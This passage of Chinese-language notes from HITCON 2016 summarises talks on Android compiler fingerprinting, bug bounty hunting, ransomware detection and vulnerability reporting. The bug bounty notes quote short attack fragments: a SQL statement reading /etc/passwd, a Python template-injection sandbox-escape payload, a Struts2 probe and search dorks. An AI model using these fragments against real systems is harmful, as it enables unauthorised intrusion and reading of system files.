&lt;li&gt;eMMC programmer &amp;amp; Adapters  &lt;/li&gt;
&lt;li&gt;eMMC Box  &lt;/li&gt;
&lt;li&gt;EPR BOx &amp;amp; BGA 169e adaptor  &lt;/li&gt;
&lt;li&gt;UFED Physical Analyzer  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Android Compiler Fingerprinting&lt;/h2&gt;
&lt;h3&gt;Speaker: Caleb Fenton, Tim Strazzere&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Android Application Packaging  &lt;ul&gt;
&lt;li&gt;apktool  &lt;/li&gt;
&lt;li&gt;axmlprinter2  &lt;/li&gt;
&lt;li&gt;jeb  &lt;/li&gt;
&lt;li&gt;Reverse with  &lt;ul&gt;
&lt;li&gt;smali / apktool  &lt;/li&gt;
&lt;li&gt;IDA Pro  &lt;/li&gt;
&lt;li&gt;jeb / jeb2  &lt;/li&gt;
&lt;li&gt;androguard  &lt;/li&gt;
&lt;li&gt;enjarify  &lt;/li&gt;
&lt;li&gt;dex2jar + jad/jd  &lt;/li&gt;
&lt;li&gt;jadx  &lt;/li&gt;
&lt;li&gt;radare  &lt;/li&gt;
&lt;li&gt;010Editoer Templates  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;AXML Files  &lt;/li&gt;
&lt;li&gt;DEX Files  &lt;ul&gt;
&lt;li&gt;Dex format is ... flexible  &lt;/li&gt;
&lt;li&gt;Only a few different compilers  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Investigation  &lt;ul&gt;
&lt;li&gt;Built logs of DEX files with different tools  &lt;/li&gt;
&lt;li&gt;Compared files with 010Editor  &lt;/li&gt;
&lt;li&gt;Found some differneces but wanted to know all of them  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Characteristics  &lt;ul&gt;
&lt;li&gt;These may be abnormal  &lt;ul&gt;
&lt;li&gt;Class interfaces  &lt;/li&gt;
&lt;li&gt;Class paths  &lt;/li&gt;
&lt;li&gt;Endian tag  &lt;/li&gt;
&lt;li&gt;Header size  &lt;/li&gt;
&lt;li&gt;Link section  &lt;/li&gt;
&lt;li&gt;String sorting  &lt;/li&gt;
&lt;li&gt;Map type order  &lt;/li&gt;
&lt;li&gt;Section contiguity  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Day 2 (2016/07/23 Sat)&lt;/h1&gt;
&lt;h2&gt;Bug Bounty 獎金獵人甘苦談 - 那些年我回報過的漏洞&lt;/h2&gt;
&lt;h3&gt;Speaker: Orange Tsai, DEVCORE Consultant&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Slides: &lt;a href="http://blog.orange.tw/2016/07/hitcon-2016-slides-bug-bounty-hunter.html"&gt;http://blog.orange.tw/2016/07/hitcon-2016-slides-bug-bounty-hunter.html&lt;/a&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;What is Bug Bounty Program?  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在官方所提供的規則及範圍下，讓獨立的研究人員可以自由尋找系統漏洞，並提供對等的獎勵。  &lt;ul&gt;
&lt;li&gt;小禮物  &lt;/li&gt;
&lt;li&gt;獎金  &lt;/li&gt;
&lt;li&gt;名譽 (Hall of Fame)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Bug Bounty 的好處？  &lt;ul&gt;
&lt;li&gt;防止漏洞流入地下市場  &lt;/li&gt;
&lt;li&gt;企業架構大難顧及網路邊界時，Bug Bounty 可以邀請更多人來測試產品的漏洞  &lt;/li&gt;
&lt;li&gt;企業對外形象宣傳：告訴社會大眾重視資安，吸引資安高手  &lt;/li&gt;
&lt;li&gt;改善社會不良風氣：告訴駭客們有更簡單的方式可以做好事  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;哪些企業已經有 Bug Bounty?  &lt;ul&gt;
&lt;li&gt;1995: Netscape  &lt;/li&gt;
&lt;li&gt;2010: Google  &lt;/li&gt;
&lt;li&gt;2011: Facebook  &lt;/li&gt;
&lt;li&gt;2013: Microsoft, Yahoo  &lt;/li&gt;
&lt;li&gt;2014: Twitter  &lt;/li&gt;
&lt;li&gt;2015: Line  &lt;/li&gt;
&lt;li&gt;2016: Uber, Spotify, Uber, Pornhub (今年 5 月開始)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;The Internet Bug Bounty  &lt;ul&gt;
&lt;li&gt;為了維護網路世界的和平，獎勵那些找出可以影響整個網路世界弱點的英雄們  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Bug Bounty 成效  &lt;ul&gt;
&lt;li&gt;Google  &lt;ul&gt;
&lt;li&gt;6 Million  &lt;/li&gt;
&lt;li&gt;750+ bugs in 2015  &lt;/li&gt;
&lt;li&gt;300+ hackrs in 2015  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Facebook  &lt;ul&gt;
&lt;li&gt;4.2 Million  &lt;/li&gt;
&lt;li&gt;526 bugs in 2015  &lt;/li&gt;
&lt;li&gt;210 hackers in 2015  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Yahoo  &lt;ul&gt;
&lt;li&gt;1.6 Million  &lt;/li&gt;
&lt;li&gt;2500+ bugs in 2015  &lt;/li&gt;
&lt;li&gt;3000+ hackers in 2015  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Bug Bounty 平台  &lt;ul&gt;
&lt;li&gt;bugcrowd  &lt;/li&gt;
&lt;li&gt;hackerone  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;參加 Bug Bounty 前的準備  &lt;ul&gt;
&lt;li&gt;為了什麼參加  &lt;ul&gt;
&lt;li&gt;獎金？  &lt;/li&gt;
&lt;li&gt;名譽？  &lt;/li&gt;
&lt;li&gt;練功？  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;對於尋找漏洞的心理準備  &lt;ul&gt;
&lt;li&gt;雖然今非昔比，但要告訴自己一定會有洞  &lt;/li&gt;
&lt;li&gt;Bug Bounty 的藍海時期大約是 2013 ~ 2014 年  &lt;/li&gt;
&lt;li&gt;大公司的主機架構到了一定的規模，一定會有漏網之魚。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;常見弱點的理解  &lt;ul&gt;
&lt;li&gt;SQL Injection  &lt;/li&gt;
&lt;li&gt;XSS  &lt;/li&gt;
&lt;li&gt;CSRF  &lt;/li&gt;
&lt;li&gt;XML External Entity  &lt;/li&gt;
&lt;li&gt;Local File Inclusion  &lt;/li&gt;
&lt;li&gt;CSV Macro Injection  &lt;/li&gt;
&lt;li&gt;XSLT Injection  &lt;/li&gt;
&lt;li&gt;SVG/XML XSS  &lt;/li&gt;
&lt;li&gt;RPO Gadget  &lt;/li&gt;
&lt;li&gt;Subdomain reaver  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;資訊的蒐集方法  &lt;ul&gt;
&lt;li&gt;DNS 與 網路邊界  &lt;ul&gt;
&lt;li&gt;子域名？相鄰域名？內部域名？  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;uberinternal.com&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;twtter.com&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;etonreve.com&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Whois? R-Whois?  &lt;/li&gt;
&lt;li&gt;併購服務  &lt;ul&gt;
&lt;li&gt;Google 的 6 個月規則：併購服務 6 個月內出現的漏洞不給獎金  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Port Scanning  &lt;ul&gt;
&lt;li&gt;Facebook Jenkins RCE by Dewhurst Security  &lt;/li&gt;
&lt;li&gt;Pornhub Memcached Unauthenticated Access by @ZephrFish  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;小案例  &lt;ul&gt;
&lt;li&gt;Yahoo! Yapache  &lt;ul&gt;
&lt;li&gt;Yahoo 自己 Patch 的 Apache，在當時也算是個創舉  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;https://login.yahoo.com/bin/hostname&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;SSL 憑證不安全  &lt;ul&gt;
&lt;li&gt;可以去看憑證的內容有什麼  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;參加 Bug Bounty 注意事項  &lt;ul&gt;
&lt;li&gt;規則所允許範圍  &lt;ul&gt;
&lt;li&gt;範圍外就無法嘗試嗎？  &lt;ul&gt;
&lt;li&gt;多多少少還是會收一下，但不收的話廠商並沒有錯。  &lt;/li&gt;
&lt;li&gt;不要找錯目標，不然會浪費自己和廠商的時間。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;規則所允許限度  &lt;ul&gt;
&lt;li&gt;Instagram's Million Dollar Bug by Wesley  &lt;ul&gt;
&lt;li&gt;回報了漏洞之後，卻做了進一步的滲透測試，拿到 AWS key，進到 S3 bucket，拿到 Instagram 的 source code  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;不要丟不符合規定的漏洞  &lt;ul&gt;
&lt;li&gt;別踏入榮譽感的誤區  &lt;/li&gt;
&lt;li&gt;常見不符合規定的例子：  &lt;ul&gt;
&lt;li&gt;SELF XSS  &lt;/li&gt;
&lt;li&gt;Information Leakage  &lt;/li&gt;
&lt;li&gt;Cookie without Secure Flage or HttpOnly  &lt;/li&gt;
&lt;li&gt;Logout CSRF  &lt;/li&gt;
&lt;li&gt;Content Injection  &lt;/li&gt;
&lt;li&gt;More ...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Facebook 去年有一萬多筆回報，但只有五百多筆是真正有效的漏洞回報  &lt;/li&gt;
&lt;li&gt;2014 Google VRP 回報狀況，很大的比例是沒有用的回報  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;撰寫報告的禮節  &lt;ul&gt;
&lt;li&gt;明確的標題及描述  &lt;/li&gt;
&lt;li&gt;附上驗證程式碼及截圖  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;尋找漏洞的思路  &lt;ul&gt;
&lt;li&gt;有做功課的 Bonus  &lt;ul&gt;
&lt;li&gt;Facebook Onavo Dom-Based XSS  &lt;ul&gt;
&lt;li&gt;2014/03/16 Onavo Reflected XSS by Mazin Ahmed  &lt;/li&gt;
&lt;li&gt;2014/05/01 Facebook fixed it  &lt;/li&gt;
&lt;li&gt;One day, Facebook revised it... Buggy again!  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;eBay SQL Injection  &lt;ul&gt;
&lt;li&gt;列舉 eBay.com 時某台主機反查到 &lt;code&gt;eBayc3.com&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;根據 WHOIS 確認為 eBay Inc. 所擁有無誤  &lt;/li&gt;
&lt;li&gt;列舉 eBayc3.com  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;images.ebayc3.com&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;連貓都會的 SQL Injection  &lt;ul&gt;
&lt;li&gt;嘗試可否 RCE  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;嘗試讀檔  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;CREATE TABLE test (src TEXT);&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE \&lt;/code&gt;test`;`  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;天下武功唯快不破  &lt;ul&gt;
&lt;li&gt;指紋辨識，收集整理  &lt;ul&gt;
&lt;li&gt;Web Applicaion?  &lt;/li&gt;
&lt;li&gt;Framework?  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;平時做好筆記，1-Day 出來搶首殺  &lt;ul&gt;
&lt;li&gt;WordPress CVE-2016-4567  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;案例  &lt;ul&gt;
&lt;li&gt;Uber Reflected XSS  &lt;ul&gt;
&lt;li&gt;馬上透過了 Google Hacking 找了一個 XSS 回報，但因為速度太慢被 Reject  &lt;/li&gt;
&lt;li&gt;中國網友跟我說：「所有服務到了中國，安全係數要乘以 0.8。」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;developer.apple.com&lt;/code&gt; 被駭案例  &lt;ul&gt;
&lt;li&gt;2013/07/18 Internet 最黑暗的一天，struts2 漏洞(s2-016)公佈。  &lt;/li&gt;
&lt;li&gt;當天有四組人馬進入，為什麼我知道？因為我是其中一個  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Yahoo Login Site RCE  &lt;ul&gt;
&lt;li&gt;依然是用 Google Hacking  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;site:yahoo.com. ext:action&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;b.login.yahoo.com&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;看起來 s2-016 work 但看起來有 WAF  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;繞過 WAF  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;認命做苦工活  &lt;ul&gt;
&lt;li&gt;可以從一些小細節來判斷要不要對這個網站下手  &lt;/li&gt;
&lt;li&gt;用 Google Hacking 黑 Google =&amp;gt; www.google.com XSS  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;site:www.google.com -adwords -finance...&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;www.google.com/trends/correlate/js/correlate.js&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;網站的 footer 停留在 2011，表示可能已經沒在維護  &lt;/li&gt;
&lt;li&gt;JavaScript 有 Minify 但沒有做 Obfuscation  &lt;/li&gt;
&lt;li&gt;別忘了他在 JavaScript  &lt;ul&gt;
&lt;li&gt;HTML Entity  &lt;/li&gt;
&lt;li&gt;八進位  &lt;/li&gt;
&lt;li&gt;十六進位  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;看起來是個 Dom-Based 的 SELF-XSS 需使用者互動  &lt;ul&gt;
&lt;li&gt;收的機率一半一半，需要找到更合理的情境說服 Google  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;繼續往下挖掘  &lt;ul&gt;
&lt;li&gt;跟 Click Hijacking 做組合技  &lt;/li&gt;
&lt;li&gt;iframe 會跟著使用者的滑鼠移動，所以使用者點擊網站上任何地方都會觸發該漏洞  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;最後拿了 5000 美金  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Facebook Remote Code Execution  &lt;ul&gt;
&lt;li&gt;反向 facebook.com 的 Whois 結果  &lt;/li&gt;
&lt;li&gt;透過 SQL Injection 拿 Shell  &lt;/li&gt;
&lt;li&gt;拿 Root  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;平行權限與邏輯問題  &lt;ul&gt;
&lt;li&gt;平行權限：例如任意發文、任意改錢、權限問題  &lt;/li&gt;
&lt;li&gt;邏輯問題：想像自己是撰寫目標程式碼的工程師的話，自己會怎麼寫。  &lt;ul&gt;
&lt;li&gt;案例：Apple XSS  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;lookup-api.apple.com/wikipedia.org&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;少見姿勢與神思路  &lt;ul&gt;
&lt;li&gt;針對架構的瞭解  &lt;/li&gt;
&lt;li&gt;非主流的漏洞，愈少人知道的東西愈有搞頭  &lt;/li&gt;
&lt;li&gt;思路的培養  &lt;ul&gt;
&lt;li&gt;CTF  &lt;/li&gt;
&lt;li&gt;其他 Bug Bounty 的 write-up  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;案例：Apple RCE，第一次進入 Apple 內網  &lt;ul&gt;
&lt;li&gt;Struts2 漏洞在 2012 年根本沒啥人知道  &lt;/li&gt;
&lt;li&gt;Google Trend of Struts2  &lt;ul&gt;
&lt;li&gt;兩次高峰都是有 RCE 漏洞  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;發現的經典模式  &lt;ul&gt;
&lt;li&gt;「你尋找你知道的東西（比如到印度的新方法），結果發現了一個你不知道的東西（例如美洲）。」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;某大廠商 XSS 0-Day 發現經過  &lt;ul&gt;
&lt;li&gt;掃 Tesla 範圍時發現一個 IP  &lt;/li&gt;
&lt;li&gt;進去發現是某大廠商的系統  &lt;/li&gt;
&lt;li&gt;思路  &lt;ul&gt;
&lt;li&gt;Struts2 撰寫 action 都需繼承 ActionSupport  &lt;/li&gt;
&lt;li&gt;因此要判斷一個網站是不是 Struts2，只要在網址最後加上 &lt;code&gt;?actionErrors=1&lt;/code&gt; 即可  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;如果被過濾的話怎麼辦  &lt;ul&gt;
&lt;li&gt;AngularJS  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Uber SSTI RCE  &lt;ul&gt;
&lt;li&gt;Template 相關攻擊手法是近幾年比較夯的東西，但較少人關注。  &lt;/li&gt;
&lt;li&gt;Uber 在自身技術部落格有提到產品技術細節  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;riders.uber.com&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;修改姓名等到寄信通知帳號變更  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Python Sandbox Bypass  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;{{ []._class__.__base__.__subclasses__() }}&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;結語  &lt;ul&gt;
&lt;li&gt;一起成為獎金獵人吧！  &lt;/li&gt;
&lt;li&gt;勿驕矜自滿，勿忘初衷。  &lt;/li&gt;
&lt;li&gt;可以自己把 know-how 做成工具  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;FèlDo: Function Event Listing and Dynamic Observing: for Detecting and Preventing Crypto Ransomware&lt;/h2&gt;
&lt;h3&gt;Speaker: Tzung-Bi Shih&lt;/h3&gt;
&lt;p&gt;Slides: &lt;a href="http://www.slideshare.net/penvirus/feldo-function-event-listing-and-dynamic-observing-for-detecting-and-preventing-crypto-ransomware"&gt;http://www.slideshare.net/penvirus/feldo-function-event-listing-and-dynamic-observing-for-detecting-and-preventing-crypto-ransomware&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Ransomware 的本質  &lt;ul&gt;
&lt;li&gt;DoS 受害者  &lt;/li&gt;
&lt;li&gt;限制軟體的使用，並以此向受害者要求付款。  &lt;/li&gt;
&lt;li&gt;最困難的是交易的部份，還必須把錢洗成白的。  &lt;/li&gt;
&lt;li&gt;沒有人能保證付了錢以後，勒索者就會把東西還給你。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Ransomware 的誤解  &lt;ul&gt;
&lt;li&gt;我們會誤解成「利用加密手段而像你要求贖金」的軟體  &lt;/li&gt;
&lt;li&gt;但以下幾個也是 Ransomware  &lt;ul&gt;
&lt;li&gt;misleading application  &lt;ul&gt;
&lt;li&gt;誤導你做出錯誤的舉動，然後再以幫你解決這問題為由跟你要贖金。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;police ransomware  &lt;ul&gt;
&lt;li&gt;假裝是當地的執法單位跟你要錢說可以規避一些法律上的問題。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;History of Ransomware on OS X  &lt;ul&gt;
&lt;li&gt;July 2013, FBI ransomware  &lt;ul&gt;
&lt;li&gt;潛伏在 Safari 裏面，搜尋完後會跳出視窗，告訴你說你散佈著作權作品或散播兒童色情，必須要付贖金才可以解決。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;June 2014, FileCoder  &lt;/li&gt;
&lt;li&gt;Sep 2015, Gopher  &lt;/li&gt;
&lt;li&gt;Nov 2015, Mabouia  &lt;/li&gt;
&lt;li&gt;Feb 2016, Ginx  &lt;/li&gt;
&lt;li&gt;Mar 2016, KeRanger (今天這個 talk 的重點）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;OSX.KeRanger  &lt;ul&gt;
&lt;li&gt;研究這個 ransomware 的行為  &lt;/li&gt;
&lt;li&gt;然後嘗試去 rescue 被它 encrypt 的檔案  &lt;/li&gt;
&lt;li&gt;撰寫 kernel module 使用動態分析的方式去 detect 其行為  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Related Work  &lt;ul&gt;
&lt;li&gt;Toward Generic (Crypto) Ransomware Detection  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Q&amp;amp;A  &lt;ul&gt;
&lt;li&gt;有沒有辦法做靜態分析？  &lt;ul&gt;
&lt;li&gt;有可能，但難度比較高，比如說用 Symbolic Execution 的方式，所以我認為還是用動態分析比較簡單。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;台灣駭客協會年度規劃及專案報告 HITCON Annual Keynote&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://kb.hitcon.org"&gt;https://kb.hitcon.org&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;資安技術文章分享平台  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zeroday.hitcon.org"&gt;https://zeroday.hitcon.org&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;漏洞通報平台  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;HITCON 2016 奇葩獎&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;奇葩人氣獎  &lt;ul&gt;
&lt;li&gt;國安局招考駭客，單手握力竟要 30 公斤。  &lt;ul&gt;
&lt;li&gt;三立新聞 2015/10/15  &lt;/li&gt;
&lt;li&gt;少林科技武僧選拔  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;中勒索軟體是否會付款？民眾：「還是拿去報廢好了，因為現在電腦也才一萬多塊而已。」  &lt;ul&gt;
&lt;li&gt;刺激台灣 PC 業最佳模範  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;東森購物網抽獎被抓包！網友攤開程式碼，發現大獎根本抽不到」  &lt;ul&gt;
&lt;li&gt;不是你的，就不是你的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ERP Server 被勒索軟體加密，所以當機。  &lt;ul&gt;
&lt;li&gt;離職前夕送給同事的大禮  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;新政府將打造高階的臺灣資安神盾局  &lt;ul&gt;
&lt;li&gt;我是奇葩隊長，我終於找到工作了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;梁振英追蹤多位台灣美女，港特首辦：駭客入侵加的  &lt;ul&gt;
&lt;li&gt;自由時報 2015-12-30  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;網曝華碩主機板 BIOS 和 UEFI 更新機制隱患大，易被劫持。  &lt;ul&gt;
&lt;li&gt;因為交涉了一年多都沒有結果，只好把細節公佈出來。  &lt;/li&gt;
&lt;li&gt;交涉過程中各種理由推托：窗口離職、下班了、颱風假  &lt;/li&gt;
&lt;li&gt;「放假，對企業來說是十分嚴肅的。」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;羅瑩雪：「他們又不方政府做， 他們是在政府的對面啊！」  &lt;ul&gt;
&lt;li&gt;在對面總比在下面好  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;民進黨網站遭駭，重要會議，手機全包塑膠袋。  &lt;ul&gt;
&lt;li&gt;如果有手汗的困擾，可以選購防水型手機。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;奇葩特別獎  &lt;ul&gt;
&lt;li&gt;MD5 惡意程式  &lt;/li&gt;
&lt;li&gt;四程式隔空盜領  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;ping 8.8.8.8 -t&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;奇葩年度研究員（正經）  &lt;ul&gt;
&lt;li&gt;Orange Tsai  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;HITCON Workshop: &lt;a href="https://zeroday.hitcon.org"&gt;ZeroDay 漏洞通報平台&lt;/a&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;通報漏洞的測試請點到為止就好，不要攻擊或是深入去拿不該拿的東西。  &lt;/li&gt;
&lt;li&gt;很多都沒有通報窗口  &lt;ul&gt;
&lt;li&gt;whois  &lt;ul&gt;
&lt;li&gt;登記的人最好更正到正確的資訊，否則通報的內容會直接給 whois 上登記的人。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;從網頁內容找  &lt;/li&gt;
&lt;li&gt;就是找不到  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;我們還會被反通報  &lt;ul&gt;
&lt;li&gt;被大學計中通報到 TACERT 說是詐騙信  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;滿分的單位  &lt;ul&gt;
&lt;li&gt;部份台灣的私立大學  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;最爛的單位  &lt;ul&gt;
&lt;li&gt;某國立大學、排名前五、在北部、有資安實驗室、還有 HITCON CTF 的成員。通報從頭到尾都沒修，還騙 TACERT 已經修了，脆後乾脆就不理他們了。（這間怎麼聽起來這麼明顯XDDD）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;比較常見的嚴重狀況  &lt;ul&gt;
&lt;li&gt;SQL Injection  &lt;/li&gt;
&lt;li&gt;Struts2  &lt;/li&gt;
&lt;li&gt;Jenkins RCE 漏洞  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;心得&lt;/h2&gt;
&lt;p&gt;今年因為公司出門票而且不用請假就可以在星期五、六參加，&lt;br /&gt;
所以拉了三位同事一起來，畢竟開發公司的程式還是要有些資安意識比較好，&lt;br /&gt;
畢竟知道了 Hackers 到底可以做哪些事情後，寫程式應該也會比較注意一些。&lt;br /&gt;
有兩位同事是第一次參加，所以大概跟他們稍微介紹了一下資安相關的常識。  &lt;/p&gt;
&lt;p&gt;算一算，從 HITCON 2012 第一次參加開始，今年也算是第五年參加了，&lt;br /&gt;
這次感覺不少非工作人員的熟面孔都沒出現，新面孔倒是多了不少，而且感覺有年輕化的趨勢。&lt;br /&gt;
